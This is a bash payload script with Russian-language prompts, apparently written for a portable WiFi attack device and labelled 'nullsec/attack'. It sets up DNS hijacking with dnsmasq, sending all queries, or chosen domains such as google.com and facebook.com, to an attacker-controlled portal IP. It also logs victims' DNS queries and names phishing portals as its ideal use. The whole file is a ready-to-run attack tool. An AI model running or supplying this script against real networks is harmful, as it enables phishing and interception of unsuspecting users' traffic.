#!/bin/bash
# Название: Перехват DNS
# Автор: bad-antics
# Описание: Перенаправление DNS-запросов на каптивные порталы
# Категория: nullsec/attack

# Автоопределение правильного беспроводного интерфейса (экспортирует $IFACE).
# В случае отсутствия подходящего интерфейса показывает диалог с ошибкой.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

PROMPT "ПЕРЕХВАТ DNS

Перехват DNS-запросов
и перенаправление на
пользовательские адреса.

Идеально для:
- Фишинговых порталов
- Анализа трафика
- Сетевых розыгрышей

Нажмите ОК для продолжения."

INTERFACE="$IFACE"

PROMPT "РЕЖИМ ПЕРЕХВАТА:

1. Весь трафик → Портал
2. Определённые домены
3. Пользовательские перенаправления

Введите режим далее."

HIJACK_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)

PORTAL_IP=$(ip addr show $INTERFACE | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-192.168.1.1}

case $HIJACK_MODE in
    1) # Весь трафик
        DNS_ENTRIES="address=/#/$PORTAL_IP"
        PROMPT "РЕЖИМ ВСЕГО ТРАФИКА

Каждый DNS-запрос будет
перенаправлен на портал:
$PORTAL_IP

Нажмите ОК для продолжения."
        ;;
        
    2) # Определённые домены
        PROMPT "ПЕРЕХВАТ ДОМЕНОВ

Введите домены для перехвата,
разделённые пробелами.

Пример: google.com
facebook.com twitter.com"
        
        DOMAINS=$(TEXT_PICKER "Домены:" "google.com facebook.com")
        
        DNS_ENTRIES=""
        for DOMAIN in $DOMAINS; do
            DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${PORTAL_IP}\n"
        done
        ;;
        
    3) # Пользовательские перенаправления
        PROMPT "ПОЛЬЗОВАТЕЛЬСКИЕ ПЕРЕНАПРАВЛЕНИЯ

Будет запрошен каждый
домен и его цель.

Нажмите ОК для настройки."
        
        DNS_ENTRIES=""
        for i in 1 2 3; do
            DOMAIN=$(TEXT_PICKER "Домен $i:" "")
            if [ -n "$DOMAIN" ]; then
                TARGET=$(TEXT_PICKER "Перенаправить на IP:" "$PORTAL_IP")
                DNS_ENTRIES="${DNS_ENTRIES}address=/${DOMAIN}/${TARGET}\n"
            fi
        done
        ;;
esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ПЕРЕХВАТ DNS?

Это перехватит
DNS-трафик.

Убедитесь, что у вас
запущен портал.

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

LOG "Запуск перехвата DNS..."
SPINNER_START "Перехват DNS..."

# Остановка существующего dnsmasq
killall dnsmasq 2>/dev/null

# Создание конфигурации dnsmasq
cat > /tmp/dnsmasq_hijack.conf << DNSMASQ_EOF
interface=$INTERFACE
no-dhcp-interface=$INTERFACE
bind-interfaces
no-resolv
$(echo -e "$DNS_ENTRIES")
DNSMASQ_EOF

# Настройка интерфейса
ifconfig $INTERFACE $PORTAL_IP netmask 255.255.255.0 up

# Запуск перехваченного DNS
dnsmasq -C /tmp/dnsmasq_hijack.conf --log-queries --log-facility=/mmc/nullsec/dns_log.txt &
DNSMASQ_PID=$!

PROMPT "ПЕРЕХВАТ DNS АКТИВЕН!

IP портала: $PORTAL_IP
Режим: $HIJACK_MODE

Запросы журналируются в:
/mmc/nullsec/dns_log.txt

Нажмите ОК для мониторинга..."

# Цикл мониторинга
DURATION=$(NUMBER_PICKER "Время работы (мин):" 10)
sleep $((DURATION * 60))

SPINNER_STOP

# Очистка
kill $DNSMASQ_PID 2>/dev/null
rm /tmp/dnsmasq_hijack.conf 2>/dev/null

QUERY_COUNT=$(wc -l < /mmc/nullsec/dns_log.txt 2>/dev/null || echo 0)

PROMPT "ПЕРЕХВАТ DNS ОСТАНОВЛЕН

Длительность: ${DURATION} мин
Запросов зарегистрировано: $QUERY_COUNT

Проверьте dns_log.txt
для просмотра перехваченных запросов.

Нажмите ОК для выхода."